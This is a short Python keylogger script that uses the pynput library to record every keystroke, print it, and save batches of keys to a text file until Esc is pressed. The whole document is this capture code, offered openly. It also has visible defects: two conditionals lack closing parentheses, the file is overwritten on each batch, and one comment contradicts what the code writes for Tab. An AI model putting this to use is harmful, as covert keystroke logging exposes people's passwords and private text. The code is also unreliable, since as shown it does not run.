import pynput
# if you're on a mac, make sure to enable the permission in settings-->security
from pynput.keyboard import Key, Listener 

pressed_keys = [] # list to store pressed keys
count = 0 # count to update the file and reset both count and pressed_keys list

# defining that functions to rule out the pressing and releasing of a key
def pressed(key):
  global count, pressed_keys
  
  pressed_keys.append(key) # adding the pressed key to the list
  count+=1
  print("{0} was pressed".format(key))
  if(count >= 50:
    count = 0
    write_on_file(pressed_keys)
    pressed_keys = []

def released(key):
  if key == Key.esc:
    return False

#defining function to access/create the file and to put content on it
def write_on_file(pressed_keys):
  with open('pressed_keys.txt', 'w') as f: # use 'w' when the file hasn't been created yet and 'a' when it has
    for key in pressed_keys:
      x = str(key).replace("'", "") # removing quotation marks
      if(x.find("space")) > 0: # when space is pressed to create a space
        f.write(' ')
      
      elif(x.find("enter")) > 0: # when enter is pressed to jump a line
        f.write('\n')
        
      elif(x.find("tab")) > 0: # when tab is pressed is pressed to create two spaces
        f.write('\t')
              
      elif(x.find("Key") == -1:
        f.write(x)


with Listener(on_press=pressed, on_release=released) as listener:
  listener.join()
